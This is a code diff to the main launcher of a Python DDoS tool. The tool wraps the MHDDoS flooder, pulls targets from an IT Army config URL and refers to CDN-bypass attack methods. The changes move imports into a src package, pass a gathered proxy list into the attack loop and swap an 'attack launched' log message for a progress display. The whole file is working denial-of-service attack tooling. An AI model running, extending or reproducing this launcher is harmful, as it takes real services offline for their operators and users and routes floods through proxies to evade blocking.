@@ -8,16 +8,17 @@ from time import sleep, time
 
 from yarl import URL
 
-from cli import init_argparse
-from core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
-from dns_utils import resolve_host, get_resolvable_targets
-from mhddos import main as mhddos_main
-from output import AtomicCounter, show_statistic, print_banner
-from proxies import update_proxies
-from targets import Targets
+from src.cli import init_argparse
+from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
+from src.dns_utils import resolve_host, get_resolvable_targets
+from src.mhddos import main as mhddos_main
+from src.output import AtomicCounter, show_statistic, print_banner, print_progress
+from src.proxies import update_proxies
+from src.targets import Targets
 
 
 Params = namedtuple('Params', 'url, ip, method, threads')
+
 
 class DaemonThreadPool:
     def __init__(self, num_threads):
@@ -44,7 +45,7 @@ class DaemonThreadPool:
                 del work_item
 
 
-def run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
+def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
     threads_per_target = total_threads // len(targets)
     params_list = []
     for target in targets:
@@ -73,13 +74,13 @@ def run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn
         statistics[params] = thread_statistics
         kwargs = {
             **params._asdict(),
-            'proxy_fn': 'empty.txt' if vpn_mode else 'proxies.txt',
             'rpc': rpc,
             'sock_timeout': proxy_timeout,
 
             'thread_pool': thread_pool,
             'event': event,
             'statistics': thread_statistics,
+            'proxies': proxies,
         }
         mhddos_main(**kwargs)
         if not table:
@@ -88,7 +89,7 @@ def run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn
                 % (params.url.host, params.method, params.threads))
 
     if not (table or debug):
-        logger.info(f'{cl.GREEN}Атака запущена, новий цикл через {period} секунд{cl.RESET}')
+        print_progress(period, 0, len(proxies))
         sleep(period)
     else:
         ts = time()
@@ -98,7 +99,7 @@ def run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn
             passed = time() - ts
             if passed > period:
                 break
-            show_statistic(statistics, refresh_rate, table, vpn_mode, ts, period, passed)
+            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
             sleep(refresh_rate)
     event.clear()
 
@@ -106,8 +107,6 @@ def run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn
 def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, debug, table):
     if table:
         debug = False
-    if debug:
-        logger.setLevel(logging.DEBUG)
 
     for bypass in ('CFB', 'DGB', 'BYPASS'):
         if bypass in http_methods:
@@ -127,9 +126,10 @@ def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods,
             )
 
         no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
+        proxies = []
         if not no_proxies:
-            update_proxies(thread_pool, period, targets, proxy_timeout)
-        run_ddos(thread_pool, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)
+            proxies = update_proxies(thread_pool, period, targets, proxy_timeout)
+        run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)
 
 
 if __name__ == '__main__':
